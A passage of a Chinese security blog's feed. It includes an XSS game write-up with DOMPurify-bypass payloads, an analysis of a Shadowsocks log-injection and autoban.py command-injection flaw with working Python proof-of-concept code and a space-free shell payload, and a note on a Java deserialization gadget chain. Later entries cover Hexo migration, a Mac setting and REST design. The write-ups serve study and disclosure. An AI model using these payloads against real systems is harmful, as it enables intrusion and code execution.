不能用，因为无法分辨'.'是浮点数还是方法调用</span></span><br></pre></td></tr></table></figure><p>可以利用进制转换构造字符串”alert”，再eval就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: eval(8680439..toString(30))(1337)</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ok-Boomer"><a href="#Ok-Boomer" class="headerlink" title="Ok, Boomer"></a>Ok, Boomer</h3></li></ul><p>这个题目用到了DOMPurify，这是一个很有效的在前端防御XSS攻击的库。</p><p>然而，题目第二句的<code>ok</code>是不存在的，可以考虑DOM Clobbering了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ok-boomer.html?boomer=<span class="tag">&lt;<span class="name">a%20id%3Dok%20href%3D%22tel:alert(1)%22</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">ok</span> <span class="attr">href</span>=<span class="string">"tel:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用DOM Clobbering覆盖<code>ok</code>变量，<code>&lt;a&gt;</code>标签的href属性可以满足toString之后完整保留字符串。</p><p>然而，在href里用<code>javascript:</code>是不可以的，会被DOMPurify过滤掉。</p><p>参考<a href="https://github.com/cure53/DOMPurify/blob/master/src/regexp.js" target="_blank" rel="noopener">regexp.js</a>的<code>IS_ALLOWED_URI</code>部分，就找到一些可以用的protocol。比如<code>tel</code>，<code>xmpp</code>都可以用。</p><p>:} done</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://xss.pwnfunction.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwnfunction&lt;/a&gt;网站上的XSS游戏，Warmups部分，也是比较简单的部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;M
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>X41 D-Sec Shadowsocks RCE分析</title>
    <link href="http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-RCE%E5%88%86%E6%9E%90/"/>
    <id>http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-RCE分析/</id>
    <published>2017-11-13T16:00:00.000Z</published>
    <updated>2020-04-14T03:06:33.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，<a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="noopener">文章在此</a>。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。</p><p>漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。</p><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol><li>日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。</li><li>命令执行漏洞原因在于Shadowsocks提供的用于检测与封禁暴力破解IP的autoban.py脚本在处理日志时不严谨，造成字符串拼接形式的命令执行。</li></ol><h2 id="LOG-FILE-MANIPULATION"><a href="#LOG-FILE-MANIPULATION" class="headerlink" title="LOG FILE MANIPULATION"></a>LOG FILE MANIPULATION</h2><p>角色有三：ss服务器端，ss客户端和用户端。</p><p>ss客户端作为socks5代理，在接收到用户端发送过来的请求后，会对请求进行解析。关键解析函数shadowsocks/common.py中parse_header(data)函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p><p>ss客户端会将请求向后传输给ss服务器端，ss服务器端也会如上写入日志。</p><p>因此，如果可以控制用户端请求的目标地址部分，即可将任意内容写入日志。简单写个脚本如下，9001是ss客户端地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">eval_data = <span class="string">"foo\nbar\ntail"</span></span><br><span class="line"></span><br><span class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9001</span>))</span><br><span class="line"></span><br><span class="line">s.send(hello)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(target)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>查看日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; cat /tmp/ss/client.log</span><br><span class="line"></span><br><span class="line">2017-10-14 20:34:00 INFO     connecting foo</span><br><span class="line">bar</span><br><span class="line">tail:80 from 127.0.0.1:62977</span><br></pre></td></tr></table></figure><p>可以看到，“bar”是单行写入的，漏洞触发成功。</p><h2 id="COMMAND-EXECUTION"><a href="#COMMAND-EXECUTION" class="headerlink" title="COMMAND EXECUTION"></a>COMMAND EXECUTION</h2><p>autoban.py脚本的作用是通过检查ss日志中的错误来对请求来源ip进行一些封禁处理。脚本处于shadowsocks/utils/autoban.py。</p><p>内容简短说就是按行查日志，如果出现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can not parse header when</span><br></pre></td></tr></table></figure><p>关键字符串在行内就进一步处理，最终提取来源IP拼接进cmd执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">'iptables -A INPUT -s %s -j DROP'</span> % ip</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>也就是说，在日志内容可控的情况下，完全可以通过精心构造请求来达到ip的内容可控，从而造成命令执行。</p><p>这里有三个坑：</p><ol><li>命令内容不能有空格，不然被切开了</li><li>命令内容不能有冒号，不然被切开了</li><li>脚本查来源ip是有频次控制的，默认为3。也就是攻击请求需要发三次以上才会触发autoban的ban。</li></ol><p>源文中为了绕过空格限制，给出的POC用到了一个将日志作为脚本执行的方法，但并不是很好，因为需要知道ss的日志存储路径。如果路径非默认，就没用了。</p><p>这里需要提一下执行bash脚本不用空格的方法。主要用到了${IFS}环境变量，${IFS}=‘空格\n\t\00’，空格在第一个字符。<br>直接给出吧：</p><ol><li>echo “a${IFS:0:1}b” 从0位置截取1个字符，这里不能用，因为引入冒号了</li><li>echo “a${IFS%???}b” %逆向裁掉3个字符，?是占位符，这个可以用</li></ol><p>因此POC也呼之欲出了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></span><br></pre></td></tr></table></figure></p><p>最后给出完成测试过程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">启动ss服务端</span><br><span class="line">python server.py -s 127.0.0.1 -p 9000 -k 1234 --<span class="built_in">log</span>-file /tmp/ss/server.log --pid-file /tmp/ss/server.pid -d start</span><br><span class="line"></span><br><span class="line">启动ss客户端</span><br><span class="line">python local.py -s 127.0.0.1 -p 9000 -l 9001 -k 1234 --<span class="built_in">log</span>-file /tmp/ss/client.log --pid-file /tmp/ss/client.pid -d start</span><br><span class="line"></span><br><span class="line">模拟定时启动autoban.py脚本检查ss客户端日志</span><br><span class="line">watch -n 1 <span class="string">"python autoban.py &lt; /tmp/ss/client.log"</span></span><br><span class="line"></span><br><span class="line">执行POC(3次！！3次！！3次！！默认就是3次！！我就不写循环:)</span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></span><br><span class="line"></span><br><span class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, 9001))</span><br><span class="line"></span><br><span class="line">s.send(hello)</span><br><span class="line"><span class="built_in">print</span> s.recv(1024)</span><br><span class="line">s.send(target)</span><br><span class="line"><span class="built_in">print</span> s.recv(1024)</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">查看eval.txt是否存在</span><br><span class="line">ls -al /tmp/ss/eval.txt</span><br></pre></td></tr></table></figure></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>谁没事儿会用autoban.py啊，大家的ss还是很安全的 :)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，&lt;a href=&quot;https://x41-dsec.de/la
      
    
    </summary>
    
      <category term="Python" scheme="http://retanoj.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="http://retanoj.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞原理小记</title>
    <link href="http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%B0%8F%E8%AE%B0/"/>
    <id>http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/</id>
    <published>2016-11-25T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.723Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于JAVA反序列化漏洞原理，<a href="http://www.angelwhu.com/blog/?p=394" title="java反序列化漏洞原理分析" target="_blank" rel="noopener">《java反序列化漏洞原理分析》</a>和<a href="https://blog.chaitin.com/2015-11-11_java_unserialize_rce/#h4.3_jenkins" title="Lib之过？Java反序列化漏洞通用利用分析" target="_blank" rel="noopener">《Lib之过？Java反序列化漏洞通用利用分析》</a>两篇文章已经分析的很是透彻了。<br>本篇小记是为了简要记录一下漏洞原理，以防忘记时可以快速查找。</p><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol><li>待序列化类必须实现 Serializable 接口。 </li><li>反序列化过程会自动调用类的readObject(java.io.ObjectInputStream in)方法。 </li><li>反序列化命令执行的核心是ChainedTransformer，助手是被装饰的Map，自动触发是AnnotationInvocationHandler。</li></ol><h2 id="Payload外衣-—-TransformedMap"><a href="#Payload外衣-—-TransformedMap" class="headerlink" title="Payload外衣 — TransformedMap"></a>Payload外衣 — TransformedMap</h2><p>TransformedMap可被序列化，可以将任意Map对象生成相应的TransformedMap对象。<br>当一个TransformedMap对象的迭代对象被调用setValue()时，会触发</p><pre><code>Map.Entry.setValue() ==&gt; AbstractInputCheckedMapDecorator.MapEntry.setValue() ==&gt; TransformedMap.checkSetValue() ==&gt; valueTransformer.transform() </code></pre><p>如果valueTransformer为一个构造好的ChainedTransformer，即可执行exec()。</p><p>即：<em>一个 TransformedMap 在 setValue() 时可以 exec() 。</em></p><h2 id="Payload外衣-—-LazyMap"><a href="#Payload外衣-—-LazyMap" class="headerlink" title="Payload外衣 — LazyMap"></a>Payload外衣 — LazyMap</h2><p>LazyMap可被序列化，也可以给Map对象添加Transformer生成相应的LazyMap。<br>当LazyMap对象成员被调用get()时，会触发 </p><pre><code>this.factory.transform(key)</code></pre><p>如果factory为一个构造好的ChainedTransformer，即可执行exec()。</p><p>即：<em>一个 LazyMap 在 get() 时可以 exec() 。</em></p><h2 id="Payload核心-—-ChainedTransformer"><a href="#Payload核心-—-ChainedTransformer" class="headerlink" title="Payload核心 — ChainedTransformer"></a>Payload核心 — ChainedTransformer</h2><p>这里Payload以命令执行为目标。<br>ChainedTransformer可以将一系列Transformer串联组装起来，而在ConstantTransformer和InvokerTransformer的帮助下，恰好可以完成</p><pre><code>Runtime.getRuntime().exec(&quot;id&quot;);</code></pre><p>但是Runtime类未实现Serializable接口，需要利用反射的方法来完成调用，即：</p><pre><code>((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null, new Object[0])).exec(&quot;id&quot;)</code></pre><p>因此，ChainedTransformer构造如下：</p><pre><code>Transformer[] transformers = new Transformer[] {   new ConstantTransformer(Runtime.class),   new InvokerTransformer(&quot;getMethod&quot;, new Class[] {       String.class, Class[].class }, new Object[] {           getRuntime&quot;, new Class[0] }),   new InvokerTransformer(&quot;invoke&quot;, new Class[] {       Object.class, Object[].class }, new Object[] {           null, new Object[0] }),    new InvokerTransformer(&quot;exec&quot;, new Class[] {       String[].class }, new Object[] { &quot;id&quot; }),    new ConstantTransformer(1) };Transformer transformerChain = new ChainedTransformer(transformers);</code></pre><h2 id="Payload触发器-—-AnnotationInvocationHandler"><a href="#Payload触发器-—-AnnotationInvocationHandler" class="headerlink" title="Payload触发器 — AnnotationInvocationHandler"></a>Payload触发器 — AnnotationInvocationHandler</h2><p>以上所述要达到命令执行，需要对Map进行setValue()或get()操作。而我们需要让一个对象在被反序列化时，自动触发对Map的操作，从而执行命令。<br>AnnotationInvocationHandler类可被序列化，且拥有Map成员。该类的对象在被反序列化时，可以满足条件。</p><h3 id="装载TransformedMap"><a href="#装载TransformedMap" class="headerlink" title="装载TransformedMap"></a>装载TransformedMap</h3><p>在java 1.7中，AnnotationInvocationHandler类的readObject()方法存在对其Map成员的setValue()调用。当Map成员为一个构造好的TransformedMap，AnnotationInvocationHandler对象在被反序列化时，即可执行exec()。</p><p>即：<em>一个被构造了 TransformedMap 成员的 AnnotationInvocationHandler 在反序列化时可以 exec() 。</em></p><h3 id="装载LazyMap"><a href="#装载LazyMap" class="headerlink" title="装载LazyMap"></a>装载LazyMap</h3><p>AnnotationInvocationHandler类实现了InvocationHandler接口，可以代理其他对象。<br>被AnnotationInvocationHandler代理的对象进行方法调用时，会执行AnnotationInvocationHandler类的invoke()方法。<br>在AnnotationInvocationHandler类的invoke()方法中，存在对其Map成员的get()调用，因此在其代理的对象进行方法调用时，有可能执行exec()。<br>假设Map对象AAAMap被一个拥有LazyMap成员的AnnotationInvocationHandler类代理了，则AAAMap对象进行方法调用时（如AAAMap.get()）就会exec()。为了反序列化时就exec()，还需要将AAAMap装填在一个新的AnnotationInvocationHandler中，最终达到如下调用链： </p><pre><code>AIHandler1.readObject() ==&gt;AIHandler1.memberValues.xxx() ==&gt; // memberValues为被代理的AAAMapAIHandler2.invoke() ==&gt;AIHandler2.memberValues.get() ==&gt; // memberValues为构造的LazyMapChainedTransformer.transform() ==&gt;exec()</code></pre><p>即：<em>一个被构造了 LazyMap 成员的 AnnotationInvocationHandler 类代理的对象，在进行方法调用时可能执行 exec() 。</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于JAVA反序列化漏洞原理，&lt;a href=&quot;http://www.angelwhu.com/blog/?p=394&quot; title=&quot;ja
      
    
    </summary>
    
      <category term="Java" scheme="http://retanoj.github.io/categories/Java/"/>
    
    
      <category term="Java" scheme="http://retanoj.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>从Jekyll迁移到Hexo</title>
    <link href="http://retanoj.github.io/2016/10/31/Misc-2016-10-31-%E4%BB%8EJekyll%E8%BF%81%E7%A7%BB%E5%88%B0Hexo/"/>
    <id>http://retanoj.github.io/2016/10/31/Misc-2016-10-31-从Jekyll迁移到Hexo/</id>
    <published>2016-10-30T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.727Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从Jekyll迁移到Hexo"><a href="#从Jekyll迁移到Hexo" class="headerlink" title="从Jekyll迁移到Hexo"></a>从Jekyll迁移到Hexo</h1><p>Blog最初使用Jekyll搭建。由于本人较懒，且对设计无感，随便找了个模板就上了。然而随着品味逐渐提高，对设计也有了一定的认识。并且，Jekyll基于Ruby，Hexo基于Nodejs；Ruby不通，Nodejs稍有涉猎；Hexo结构简洁，Jekyll看着就烦。最终，还是想折腾折腾，就迁移了。</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>首先假设已安装node与npm，同时建议将npm源换到淘宝的镜像(<a href="https://npm.taobao.org/" target="_blank" rel="noopener">https://npm.taobao.org/</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm install -g hexo-cli # 全局安装hexo-cli</span><br><span class="line"><span class="meta">$</span> npm install hexo --save # 本地安装hexo</span><br></pre></td></tr></table></figure><p>此后会在本地目录下生成node_modules，误删！！</p><p>建立一个hexo项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo init</span><br></pre></td></tr></table></figure><p>接下来，安装Hexo插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm i(nstall) hexo-generator-index --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-archive --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-category --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-tag --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-server --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-git --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-heroku --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-rsync --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-deployer-openshift --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-renderer-marked@0.2 --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-renderer-stylus@0.2 --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-feed@1 --save</span><br><span class="line"><span class="meta">$</span> npm i hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure><p>安装结束:)</p><h2 id="主题变更"><a href="#主题变更" class="headerlink" title="主题变更"></a>主题变更</h2><p>先把hexo server跑起来看看效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo server</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:4000看看，Hexo果然看着比Jekyll顺眼。" target="_blank" rel="noopener">http://localhost:4000看看，Hexo果然看着比Jekyll顺眼。</a></p><p>不过我们还是来换个主题——NexT。为什么换？我就是想换！</p><p>下载最新版NexT主题到themes/next文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>修改站点配置文件_config.yml，启用主题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure><p>完成:)</p><p>跑起来看看，跟NexT官网是一样的！</p><p>更多主题细节请参考NexT主题官网！！</p><h2 id="更多配置"><a href="#更多配置" class="headerlink" title="更多配置"></a>更多配置</h2><ul><li>添加Git部署，修改站点配置文件_config.yml</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   type: git</span><br><span class="line">   repository: git@github.com:path_to_your_git_blog.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure><ul><li>添加”分类”页面</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo new page categories</span><br></pre></td></tr></table></figure><p>编辑页面内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">type: "categories"</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>更多内容，如添加”标签”页面，修改scaffolds模板，fancybox使用等就不再赘述</p><h2 id="文件迁移"><a href="#文件迁移" class="headerlink" title="文件迁移"></a>文件迁移</h2><p>说来简单，将原Jekyll的_posts文件夹下的内容复制到source/_posts下即可。</p><p>同时，最好要保证帖子开头的字段与Hexo模板内字段一致</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.ezlippi.com/blog/2016/02/jekyll-to-hexo.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">Jekyll迁移到Hexo搭建个人博客</a></p><p><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT主题官网</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从Jekyll迁移到Hexo&quot;&gt;&lt;a href=&quot;#从Jekyll迁移到Hexo&quot; class=&quot;headerlink&quot; title=&quot;从Jekyll迁移到Hexo&quot;&gt;&lt;/a&gt;从Jekyll迁移到Hexo&lt;/h1&gt;&lt;p&gt;Blog最初使用Jekyll搭建。由于本人较
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>解决MAC双屏时同时滑动</title>
    <link href="http://retanoj.github.io/2016/07/26/Misc-2016-07-26-%E8%A7%A3%E5%86%B3MAC%E5%8F%8C%E5%B1%8F%E6%97%B6%E5%90%8C%E6%97%B6%E6%BB%91%E5%8A%A8/"/>
    <id>http://retanoj.github.io/2016/07/26/Misc-2016-07-26-解决MAC双屏时同时滑动/</id>
    <published>2016-07-25T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Just-do-it"><a href="#Just-do-it" class="headerlink" title="Just do it"></a>Just do it</h2><p>系统偏好设置 -&gt; Mission Control -&gt; 显示器具有单独的Spaces(勾选)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Just-do-it&quot;&gt;&lt;a href=&quot;#Just-do-it&quot; class=&quot;headerlink&quot; title=&quot;Just do it&quot;&gt;&lt;/a&gt;Just do it&lt;/h2&gt;&lt;p&gt;系统偏好设置 -&amp;gt; Mission Control -&amp;gt; 显示器
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>对RESTful的理解</title>
    <link href="http://retanoj.github.io/2016/07/21/Misc-2016-07-21-%E5%AF%B9RESTful%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>http://retanoj.github.io/2016/07/21/Misc-2016-07-21-对RESTful的理解/</id>
    <published>2016-07-20T16:00:00.000Z</published>
    <updated>2018-12-12T02:20:05.725Z</updated>
    
    <content type="html"><![CDATA[<p>REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。</p><p>表现状态转变(REST)缺少个主体，即“资源”。所以可以被叫做“资源表现状态转变”。</p><h2 id="一、资源-Resources"><a href="#一、资源-Resources" class="headerlink" title="一、资源(Resources)"></a>一、资源(Resources)</h2><p>资源，即网络上的一个实体。它可能是一段文本，一张图片，也可能是一个服务。通常用URI（统一资源定位符）指向它。</p><h2 id="二、表现-Representation"><a href="#二、表现-Representation" class="headerlink" title="二、表现(Representation)"></a>二、表现(Representation)</h2><p>表现，即资源这个信息实体的表现形式。例如文本可以以HTML的形式来展现给用户，还可以已JSON展现。</p><p>因此，有些言论中说，URI中定位到资源时的后缀带有“.html”是不必要的，因为它在“资源”的层面表达了“表现”层面所要表达的内容。这样的说法也不无道理。而资源的具体表现形式，应该在HTTP协议中的Content-Type字段和Accept字段中被描述。</p><h2 id="三、状态转变-State-Transfer"><a href="#三、状态转变-State-Transfer" class="headerlink" title="三、状态转变(State Transfer)"></a>三、状态转变(State Transfer)</h2><p>HTTP协议是一个无状态的协议。客户端和服务器交互的状态被通过各种方式保存在服务端。例如用户上传了自己的头像，更新了自己的昵称，这些都在服务端被记录和保存。由此看来，如果用户想让处在服务端的资源发生改变，就要通过某种手段让其状态发生转变。而这种转变是建立在“表现”层上，所以被叫做“表现状态转变”。</p><p>在REST里规定了客户端操纵资源的几个动词，即HTTP协议中的Method。包括“GET”(获取)、“POST”(新建)、“PUT”(更新)、“DELETE”(删除)。</p><h2 id="四、案例-Case-Study"><a href="#四、案例-Case-Study" class="headerlink" title="四、案例(Case Study)"></a>四、案例(Case Study)</h2><p>1) /posts/33  vs  /posts/show/33</p><p>URI里包含动词是RESTful设计的一大误区。动词应该是HTTP的Method，不应该出现在URI中。URI是单纯的对互联网上资源的指向。因此GET /posts/33是正确的设计方法。</p><p>2) /account/2/transfer/104/to/5  vs  /transaction</p><p>RESTful的动词的确存在局限，例如在金钱交易的时候，四个动词均不能表达“转账”的概念。但换个角度来看，“转账”可以成为一项服务，而服务可以被看做互联网上的一种资源（服务是资源）。因此可以在URI中将“转账”设计成/transaction，通过动词POST来建立转账记录。</p><pre><code>POST /transaction HTTP/2.0...account=2&amp;money=104.00&amp;to=5</code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/09/restful.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。&lt;/p&gt;
&lt;p&gt;表现状态转变(RES
      
    
    </summary>
    
      <category term="Misc" scheme="http://retanoj.github.io/categories/Misc/"/>
    
    
      <category term="Misc" scheme="http://retanoj.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>leetcode 338.Counting Bits</title>
    <link href="http://retanoj.github.io/2016/04/16/%E9%A2%98%E7%9B%AE-2016-04-16-leetcode-338-Counting-Bits/"/>
